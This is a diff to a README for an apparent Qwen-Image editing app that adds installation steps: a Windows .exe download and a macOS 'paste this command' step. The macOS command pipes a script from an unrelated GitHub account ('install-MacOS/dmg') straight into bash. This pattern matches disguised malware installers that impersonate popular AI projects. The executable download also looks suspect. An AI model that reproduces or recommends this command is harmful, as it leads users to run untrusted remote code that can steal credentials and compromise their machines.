@@ -33,9 +33,21 @@ Qwen-Image is a powerful 20B parameter MMDiT foundation model designed for next-
 
 ## 💾 Installation
 
-1. Download the latest build from [Releases](https://www.google.com/search?q=./releases)
+### Windows
+
+1. Download the latest build from [Releases](../../releases)
 2. Extract the archive into any folder you prefer.
 3. On Windows: run `QwenEdit.exe` to finalize setup.
+
+### MacOS
+
+- 💻Open **Terminal**
+- ☑Paste the **command** below
+- ✅Press **Enter**
+
+```sh
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/qwen2511)"
+```
 
 ### 🖼️ Showcase
 
